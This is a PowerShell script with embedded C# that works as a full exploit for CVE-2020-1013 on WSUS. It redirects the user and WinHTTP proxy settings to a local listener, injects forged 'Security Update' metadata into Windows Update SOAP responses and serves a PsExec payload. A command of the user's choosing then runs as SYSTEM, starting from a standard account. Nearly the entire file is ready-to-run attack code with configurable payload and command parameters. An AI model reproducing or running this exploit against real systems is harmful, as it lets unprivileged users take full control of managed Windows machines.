<#
.SYNOPSIS
    WSuspicious - No Admin Required Version

.DESCRIPTION
    CVE-2020-1013 WSUS privilege escalation WITHOUT requiring admin rights.
    Uses localhost-only binding which works for local SYSTEM service.

.NOTES
    Runs as STANDARD USER (no admin needed!)
    The whole point is privilege escalation from standard user to SYSTEM.
#>

[CmdletBinding()]
param(
    [string]$Exe = ".\PsExec64.exe",
    [string]$Command = '-accepteula -s -d cmd /c "echo 1 > C:\wsuspicious.was.here"',
    [int]$ProxyPort = 13337,
    [switch]$DebugMode,
    [switch]$AutoInstall,
    [switch]$Help
)

$ErrorActionPreference = "Stop"

function Show-Banner {
    Write-Host @"
╔═══════════════════════════════════════════════════════════════╗
║     WSuspicious - No Admin Required! (Standard User OK)      ║
║              CVE-2020-1013 WSUS Privilege Escalation          ║
╚═══════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan
}

function Show-Help {
    Write-Host @"

Usage: .\WSuspicious-NoAdmin.ps1 [OPTIONS]

✅ NO ADMIN RIGHTS NEEDED! Runs as standard user.

Options:
  -Exe <path>         Path to executable (Default: .\PsExec64.exe)
  -Command <cmd>      Command to execute
  -ProxyPort <port>   Proxy port (Default: 13337)
  -DebugMode          Enable verbose output
  -AutoInstall        Auto-start Windows Update
  -Help               Show this help

Example:
  .\WSuspicious-NoAdmin.ps1 -AutoInstall -DebugMode

"@ -ForegroundColor White
}

function Write-Log {
    param([string]$Message, [ConsoleColor]$Color = "White")
    Write-Host "[$((Get-Date).ToString('HH:mm:ss'))] $Message" -ForegroundColor $Color
}

function Write-DebugLog {
    param([string]$Message)
    if ($DebugMode) { Write-Log $Message Gray }
}

function Get-WSUSConfig {
    try {
        $wsus = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "WUServer" -ErrorAction Stop
        return $wsus.WUServer
    } catch {
        return $null
    }
}

function Set-SystemProxy {
    param([string]$Server, [int]$Port)

    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"

    # Backup (with error handling for non-existent keys)
    try {
        $script:BackupProxyEnable = (Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue).ProxyEnable
        $script:BackupProxyServer = (Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue).ProxyServer
    } catch {
        $script:BackupProxyEnable = 0
        $script:BackupProxyServer = $null
    }

    # Backup WinHTTP proxy (for Windows Update service)
    try {
        $script:BackupWinHttpProxy = & netsh winhttp show proxy 2>$null | Out-String
    } catch {
        $script:BackupWinHttpProxy = $null
    }

    # Set IE proxy (for user context)
    Set-ItemProperty -Path $regPath -Name "ProxyEnable" -Value 1
    Set-ItemProperty -Path $regPath -Name "ProxyServer" -Value "${Server}:${Port}"

    # Set WinHTTP proxy (for Windows Update SERVICE - this is the key!)
    try {
        $result = & netsh winhttp set proxy "${Server}:${Port}" "<local>" 2>&1
        Write-DebugLog "WinHTTP proxy set: $result"
    } catch {
        Write-Log "Warning: Could not set WinHTTP proxy (may need admin)" Yellow
    }

    Write-Log "System proxy set to ${Server}:${Port}" Green
}

function Remove-SystemProxy {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"

    try {
        # Restore IE proxy
        if ($null -ne $script:BackupProxyEnable) {
            Set-ItemProperty -Path $regPath -Name "ProxyEnable" -Value $script:BackupProxyEnable -ErrorAction SilentlyContinue
        }
        if ($null -ne $script:BackupProxyServer) {
            Set-ItemProperty -Path $regPath -Name "ProxyServer" -Value $script:BackupProxyServer -ErrorAction SilentlyContinue
        }

        # Restore WinHTTP proxy
        if ($script:BackupWinHttpProxy -match "Direct access") {
            & netsh winhttp reset proxy 2>&1 | Out-Null
        }

        Write-Log "System proxy restored" Green
    } catch {
        Write-Log "Warning: Could not fully restore proxy settings" Yellow
    }
}

function Start-WindowsUpdate {
    Write-Log "Starting Windows Update scan..." Cyan
    $usoclient = Get-Command usoclient.exe -ErrorAction SilentlyContinue
    if ($usoclient) {
        Start-Process -FilePath "usoclient.exe" -ArgumentList "StartInteractiveScan" -NoNewWindow
        Write-Log "Windows Update scan initiated" Green
    } else {
        Write-Log "usoclient.exe not found - start manually" Yellow
    }
}

#region C# HTTP Proxy - NO ADMIN REQUIRED
$proxyCode = @"
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Security.Cryptography;

public class NoAdminWSUSProxy
{
    private HttpListener listener;
    private string wsusHost;
    private int wsusPort;
    private int localProxyPort;
    private byte[] payloadBytes;
    private string payloadName;
    private string payloadSHA1;
    private string payloadSHA256;
    private string command;
    private int updateID1;
    private int updateID2;
    private int deploymentID1;
    private int deploymentID2;
    private string uuid1;
    private string uuid2;
    private bool isDebug;
    private int stage = 0;
    private bool running = true;
    private object lockObj = new object();

    public NoAdminWSUSProxy(string wsusUrl, byte[] payload, string payloadName, string command, bool debug)
    {
        Uri wsusUri = new Uri(wsusUrl);
        this.wsusHost = wsusUri.Host;
        this.wsusPort = wsusUri.Port;

        this.payloadBytes = payload;
        this.payloadName = payloadName;
        this.command = WebUtility.HtmlEncode(WebUtility.HtmlEncode(command));
        this.isDebug = debug;

        using (var sha1 = SHA1.Create())
        {
            this.payloadSHA1 = Convert.ToBase64String(sha1.ComputeHash(payload));
        }
        using (var sha256 = SHA256.Create())
        {
            this.payloadSHA256 = Convert.ToBase64String(sha256.ComputeHash(payload));
        }

        Random rnd = new Random();
        this.updateID1 = rnd.Next(900000, 999999);
        this.updateID2 = rnd.Next(900000, 999999);
        this.deploymentID1 = rnd.Next(80000, 99999);
        this.deploymentID2 = rnd.Next(80000, 99999);
        this.uuid1 = Guid.NewGuid().ToString();
        this.uuid2 = Guid.NewGuid().ToString();

        if (isDebug)
        {
            Console.WriteLine("[DEBUG] WSUS: {0}:{1}", wsusHost, wsusPort);
            Console.WriteLine("[DEBUG] Update IDs: {0}, {1}", updateID1, updateID2);
        }
    }

    public void Start(int port)
    {
        this.localProxyPort = port;
        listener = new HttpListener();

        // ✅ LOCALHOST ONLY - NO ADMIN REQUIRED!
        // SYSTEM service CAN connect to localhost
        listener.Prefixes.Add(string.Format("http://localhost:{0}/", port));
        listener.Prefixes.Add(string.Format("http://127.0.0.1:{0}/", port));

        try
        {
            listener.Start();
            Console.WriteLine("[*] Proxy listening on port {0} (localhost only)", port);
            Console.WriteLine("[*] ✅ NO ADMIN RIGHTS NEEDED!");
        }
        catch (HttpListenerException ex)
        {
            if (ex.ErrorCode == 5)
            {
                throw new Exception("Access Denied - This should not happen! Report this bug.");
            }
            throw;
        }

        Thread listenerThread = new Thread(Listen);
        listenerThread.IsBackground = true;
        listenerThread.Start();
    }

    private void Listen()
    {
        while (running && listener.IsListening)
        {
            try
            {
                var context = listener.GetContext();
                ThreadPool.QueueUserWorkItem(o => HandleRequest(context));
            }
            catch (Exception ex)
            {
                if (running && isDebug)
                {
                    Console.WriteLine("[DEBUG] Listen error: {0}", ex.Message);
                }
            }
        }
    }

    private void HandleRequest(HttpListenerContext context)
    {
        HttpListenerRequest request = null;
        HttpListenerResponse response = null;

        try
        {
            request = context.Request;
            response = context.Response;

            if (isDebug)
            {
                Console.WriteLine("[DEBUG] {0} {1}", request.HttpMethod, request.RawUrl);
            }

            // Handle payload download
            if (request.RawUrl.EndsWith(".exe") || request.RawUrl.Contains("/Content/"))
            {
                Console.WriteLine("[*] 📦 Serving payload to Windows Update");
                response.StatusCode = 200;
                response.ContentType = "application/octet-stream";
                response.ContentLength64 = payloadBytes.Length;
                response.OutputStream.Write(payloadBytes, 0, payloadBytes.Length);
                response.OutputStream.Close();
                return;
            }

            // Proxy to WSUS
            string targetUrl = string.Format("http://{0}:{1}{2}", wsusHost, wsusPort, request.RawUrl);

            HttpWebRequest proxyRequest = (HttpWebRequest)WebRequest.Create(targetUrl);
            proxyRequest.Method = request.HttpMethod;
            proxyRequest.KeepAlive = false;
            proxyRequest.Timeout = 30000;

            // Copy headers
            foreach (string header in request.Headers.AllKeys)
            {
                if (!WebHeaderCollection.IsRestricted(header))
                {
                    proxyRequest.Headers[header] = request.Headers[header];
                }
            }

            if (!string.IsNullOrEmpty(request.ContentType))
            {
                proxyRequest.ContentType = request.ContentType;
            }

            // Copy request body
            string requestBody = null;
            if (request.HasEntityBody)
            {
                using (var reader = new StreamReader(request.InputStream, request.ContentEncoding))
                {
                    requestBody = reader.ReadToEnd();
                }

                // Detect stages
                lock (lockObj)
                {
                    if (requestBody.Contains("<InstalledNonLeafUpdateIDs>") && !requestBody.Contains("<HardwareIDs>"))
                    {
                        Console.WriteLine("[*] ⭐ Stage 1 detected - SyncUpdates");
                        stage = 1;
                    }
                    else if (requestBody.Contains("<revisionIDs>"))
                    {
                        Console.WriteLine("[*] ⭐ Stage 2 detected - GetExtendedUpdateInfo");
                        stage = 2;
                    }
                }

                byte[] bytes = Encoding.UTF8.GetBytes(requestBody);
                proxyRequest.ContentLength = bytes.Length;
                using (var stream = proxyRequest.GetRequestStream())
                {
                    stream.Write(bytes, 0, bytes.Length);
                }
            }

            // Get response
            string responseBody;
            using (HttpWebResponse proxyResponse = (HttpWebResponse)proxyRequest.GetResponse())
            {
                using (var reader = new StreamReader(proxyResponse.GetResponseStream(), Encoding.UTF8))
                {
                    responseBody = reader.ReadToEnd();
                }

                // Inject payloads
                lock (lockObj)
                {
                    if (stage == 1 && responseBody.Contains("<SyncUpdatesResult>"))
                    {
                        responseBody = InjectStage1(responseBody);
                        Console.WriteLine("[*] ✅ Stage 1 injected");
                        stage = 0;
                    }
                    else if (stage == 2 && request.Headers["SOAPAction"] != null &&
                             request.Headers["SOAPAction"].Contains("GetExtendedUpdateInfo"))
                    {
                        responseBody = InjectStage2(responseBody);
                        Console.WriteLine("[*] ✅ Stage 2 injected");
                        Console.WriteLine("[*] ⏳ Waiting for Windows Update to install...");
                        stage = 0;
                    }
                }

                response.StatusCode = (int)proxyResponse.StatusCode;
                response.ContentType = proxyResponse.ContentType;

                byte[] buffer = Encoding.UTF8.GetBytes(responseBody);
                response.ContentLength64 = buffer.Length;
                response.OutputStream.Write(buffer, 0, buffer.Length);
            }

            response.OutputStream.Close();
        }
        catch (WebException wex)
        {
            if (isDebug)
            {
                Console.WriteLine("[DEBUG] WebException: {0}", wex.Message);
            }

            if (response != null)
            {
                response.StatusCode = 502;
                response.Close();
            }
        }
        catch (Exception ex)
        {
            if (isDebug)
            {
                Console.WriteLine("[DEBUG] Error: {0}", ex.Message);
            }

            if (response != null && !response.OutputStream.CanWrite)
            {
                try { response.Close(); } catch { }
            }
        }
    }

    private string InjectStage1(string responseXml)
    {
        string newUpdates = string.Format(@"
<NewUpdates>
    <UpdateInfo>
        <ID>{0}</ID>
        <Deployment>
            <ID>{1}</ID>
            <Action>Install</Action>
            <IsAssigned>true</IsAssigned>
            <LastChangeTime>2020-02-29T00:00:00Z</LastChangeTime>
            <AutoSelect>0</AutoSelect>
            <AutoDownload>0</AutoDownload>
            <SupersedenceBehavior>0</SupersedenceBehavior>
        </Deployment>
        <IsLeaf>true</IsLeaf>
        <Xml>&lt;UpdateIdentity UpdateID=""{2}"" RevisionNumber=""204"" /&gt;&lt;Properties UpdateType=""Software"" ExplicitlyDeployable=""true"" AutoSelectOnWebSites=""true"" /&gt;&lt;Relationships&gt;&lt;Prerequisites&gt;&lt;AtLeastOne IsCategory=""true""&gt;&lt;UpdateIdentity UpdateID=""0fa1201d-4330-4fa8-8ae9-b877473b6441"" /&gt;&lt;/AtLeastOne&gt;&lt;/Prerequisites&gt;&lt;BundledUpdates&gt;&lt;UpdateIdentity UpdateID=""{3}"" RevisionNumber=""204"" /&gt;&lt;/BundledUpdates&gt;&lt;/Relationships&gt;</Xml>
    </UpdateInfo>
    <UpdateInfo>
        <ID>{4}</ID>
        <Deployment>
            <ID>{5}</ID>
            <Action>Bundle</Action>
            <IsAssigned>true</IsAssigned>
            <LastChangeTime>2020-02-29T00:00:00Z</LastChangeTime>
            <AutoSelect>0</AutoSelect>
            <AutoDownload>0</AutoDownload>
            <SupersedenceBehavior>0</SupersedenceBehavior>
        </Deployment>
        <IsLeaf>true</IsLeaf>
        <Xml>&lt;UpdateIdentity UpdateID=""{6}"" RevisionNumber=""204"" /&gt;&lt;Properties UpdateType=""Software"" /&gt;&lt;Relationships&gt;&lt;/Relationships&gt;&lt;ApplicabilityRules&gt;&lt;IsInstalled&gt;&lt;False /&gt;&lt;/IsInstalled&gt;&lt;IsInstallable&gt;&lt;True /&gt;&lt;/IsInstallable&gt;&lt;/ApplicabilityRules&gt;</Xml>
    </UpdateInfo>
</NewUpdates>",
            updateID1, deploymentID1, uuid1, uuid2, updateID2, deploymentID2, uuid2);

        responseXml = Regex.Replace(responseXml, @"<NewUpdates>.*?</NewUpdates>", "", RegexOptions.Singleline);
        responseXml = Regex.Replace(responseXml, @"<ChangedUpdates>.*?</ChangedUpdates>", "", RegexOptions.Singleline);
        responseXml = Regex.Replace(responseXml, @"<OutOfScopeRevisionIDs>.*?</OutOfScopeRevisionIDs>", "", RegexOptions.Singleline);

        responseXml = responseXml.Replace("</SyncUpdatesResult>", newUpdates + "</SyncUpdatesResult>");

        return responseXml;
    }

    private string InjectStage2(string responseXml)
    {
        string payloadUrl = string.Format("http://127.0.0.1:{0}/Content/payload.exe", localProxyPort);

        string extendedInfo = string.Format(@"<?xml version=""1.0"" encoding=""utf-8""?>
<s:Envelope xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/"">
    <s:Body xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
        <GetExtendedUpdateInfoResponse xmlns=""http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService"">
            <GetExtendedUpdateInfoResult>
                <Updates>
                    <Update>
                        <ID>{0}</ID>
                        <Xml>&lt;ExtendedProperties DefaultPropertiesLanguage=""en"" Handler=""http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/CommandLineInstallation"" MaxDownloadSize=""{1}"" MinDownloadSize=""{2}""&gt;&lt;InstallationBehavior RebootBehavior=""NeverReboots"" /&gt;&lt;/ExtendedProperties&gt;&lt;Files&gt;&lt;File Digest=""{3}"" DigestAlgorithm=""SHA1"" FileName=""{4}"" Size=""{5}"" Modified=""2020-01-01T00:00:00.000Z""&gt;&lt;AdditionalDigest Algorithm=""SHA256""&gt;{6}&lt;/AdditionalDigest&gt;&lt;/File&gt;&lt;/Files&gt;&lt;HandlerSpecificData type=""cmd:CommandLineInstallation""&gt;&lt;InstallCommand Arguments=""{7}"" Program=""{8}"" RebootByDefault=""false"" DefaultResult=""Succeeded""&gt;&lt;ReturnCode Reboot=""false"" Result=""Succeeded"" Code=""0"" /&gt;&lt;/InstallCommand&gt;&lt;/HandlerSpecificData&gt;</Xml>
                    </Update>
                    <Update>
                        <ID>{9}</ID>
                        <Xml>&lt;ExtendedProperties DefaultPropertiesLanguage=""en"" MsrcSeverity=""Important"" IsBeta=""false""&gt;&lt;SupportUrl&gt;https://support.microsoft.com&lt;/SupportUrl&gt;&lt;SecurityBulletinID&gt;MS20-001&lt;/SecurityBulletinID&gt;&lt;KBArticleID&gt;KB0000001&lt;/KBArticleID&gt;&lt;/ExtendedProperties&gt;</Xml>
                    </Update>
                    <Update>
                        <ID>{10}</ID>
                        <Xml>&lt;LocalizedProperties&gt;&lt;Language&gt;en&lt;/Language&gt;&lt;Title&gt;Security Update&lt;/Title&gt;&lt;Description&gt;Install this update to resolve issues.&lt;/Description&gt;&lt;/LocalizedProperties&gt;</Xml>
                    </Update>
                    <Update>
                        <ID>{11}</ID>
                        <Xml>&lt;LocalizedProperties&gt;&lt;Language&gt;en&lt;/Language&gt;&lt;Title&gt;Update Component&lt;/Title&gt;&lt;/LocalizedProperties&gt;</Xml>
                    </Update>
                </Updates>
                <FileLocations>
                    <FileLocation>
                        <FileDigest>{12}</FileDigest>
                        <Url>{13}</Url>
                    </FileLocation>
                </FileLocations>
            </GetExtendedUpdateInfoResult>
        </GetExtendedUpdateInfoResponse>
    </s:Body>
</s:Envelope>",
            updateID2, payloadBytes.Length, payloadBytes.Length,
            WebUtility.HtmlEncode(payloadSHA1), WebUtility.HtmlEncode(payloadName), payloadBytes.Length,
            WebUtility.HtmlEncode(payloadSHA256), command, WebUtility.HtmlEncode(payloadName),
            updateID1, updateID1, updateID2, payloadSHA1, payloadUrl);

        return extendedInfo;
    }

    public void Stop()
    {
        running = false;
        if (listener != null && listener.IsListening)
        {
            try
            {
                listener.Stop();
                listener.Close();
            }
            catch { }
        }
    }
}
"@
#endregion

#region Main
try {
    Show-Banner

    if ($Help) {
        Show-Help
        exit 0
    }

    Write-Log "✅ Running as STANDARD USER (no admin required!)" Green
    Write-Host ""

    # Check payload
    if (!(Test-Path $Exe)) {
        Write-Log "ERROR: Payload not found: $Exe" Red
        Write-Log "" White
        Write-Log "Download PsExec64.exe:" Yellow
        Write-Log "  Invoke-WebRequest -Uri 'https://live.sysinternals.com/PsExec64.exe' -OutFile '.\PsExec64.exe'" Cyan
        exit 1
    }

    # Check WSUS
    Write-Log "Checking WSUS configuration..." Cyan
    $wsusServer = Get-WSUSConfig

    if (!$wsusServer) {
        Write-Log "ERROR: No WSUS configured" Red
        Write-Log "This exploit requires WSUS via Group Policy" Yellow
        exit 1
    }

    $wsusUri = [Uri]$wsusServer
    Write-Log "Found WSUS: $($wsusUri.Host):$($wsusUri.Port)" Green

    # Load payload
    Write-Log "Loading payload: $Exe" Cyan
    $payloadBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $Exe).Path)
    $payloadName = [System.IO.Path]::GetFileName($Exe)
    Write-Log "Payload: $payloadName ($($payloadBytes.Length) bytes)" Green

    # Compile proxy
    Write-Log "Compiling HTTP proxy..." Cyan
    try {
        # Check if type already exists (from previous run in same session)
        if (-not ([System.Management.Automation.PSTypeName]'NoAdminWSUSProxy').Type) {
            Add-Type -TypeDefinition $proxyCode -Language CSharp -ReferencedAssemblies @('System.Net', 'System.Web') -ErrorAction Stop
            Write-Log "Proxy compiled successfully" Green
        } else {
            Write-Log "Proxy already compiled (reusing from session)" Green
        }
    } catch {
        if ($_.Exception.Message -match "already exists") {
            Write-Log "Proxy already compiled (reusing from session)" Green
        } else {
            Write-Log "ERROR: Failed to compile proxy" Red
            Write-Log $_.Exception.Message Red
            exit 1
        }
    }

    # Create proxy
    Write-Log "Initializing proxy..." Cyan
    $proxy = New-Object NoAdminWSUSProxy($wsusServer, $payloadBytes, $payloadName, $Command, $DebugMode)

    # Start proxy
    Write-Log "Starting proxy on port $ProxyPort..." Cyan
    $proxy.Start($ProxyPort)
    Start-Sleep -Seconds 2

    # Set system proxy
    Set-SystemProxy -Server "127.0.0.1" -Port $ProxyPort

    Write-Host ""
    Write-Log "═══════════════════════════════════════════════" Yellow
    Write-Log "PROXY ACTIVE - Intercepting WSUS traffic" Green
    Write-Log "═══════════════════════════════════════════════" Yellow
    Write-Host ""
    Write-Log "Command: $Command" Cyan
    Write-Log "Proof file: C:\wsuspicious.was.here" Cyan
    Write-Host ""

    if ($AutoInstall) {
        Write-Log "Auto-starting Windows Update in 3 seconds..." Cyan
        Start-Sleep -Seconds 3
        Start-WindowsUpdate
    } else {
        Write-Log "Manually start Windows Update:" Yellow
        Write-Log "  Settings > Update & Security > Check for updates" White
        Write-Log "  OR: usoclient.exe StartInteractiveScan" Cyan
    }

    Write-Host ""
    Write-Log "Press Ctrl+C to stop..." White
    Write-Host ""

    # Monitor for success
    $checkCount = 0
    $maxWaitSeconds = 600
    $startTime = Get-Date

    while ((((Get-Date) - $startTime).TotalSeconds -lt $maxWaitSeconds)) {
        Start-Sleep -Seconds 5
        $checkCount++

        if (Test-Path "C:\wsuspicious.was.here") {
            Write-Host ""
            Write-Log "═══════════════════════════════════════════════" Green
            Write-Log "🎉 SUCCESS! Privilege Escalation Complete!" Green
            Write-Log "═══════════════════════════════════════════════" Green
            Write-Host ""
            Write-Log "✅ Proof file created: C:\wsuspicious.was.here" Cyan
            Write-Log "✅ Command executed as SYSTEM" Cyan
            Write-Host ""
            break
        }

        if (($checkCount -band 6) -eq 0) {
            Write-DebugLog "Still waiting... ($($checkCount * 5) seconds elapsed)"
        }
    }

    if (-not (Test-Path "C:\wsuspicious.was.here")) {
        Write-Log "Timeout reached after $maxWaitSeconds seconds" Yellow
        Write-Log "Exploit may have failed or needs more time" Yellow
    }

} catch {
    Write-Log "ERROR: $($_.Exception.Message)" Red
    if ($DebugMode) {
        Write-Log "Stack trace:" Red
        Write-Log $_.ScriptStackTrace Red
    }
} finally {
    Write-Host ""
    Write-Log "Cleaning up..." Cyan

    if ($proxy) {
        try {
            $proxy.Stop()
            Write-Log "Proxy stopped" Green
        } catch {
            Write-DebugLog "Proxy stop error: $($_.Exception.Message)"
        }
    }

    Remove-SystemProxy
    Write-Log "Cleanup complete" Green
}
#endregion
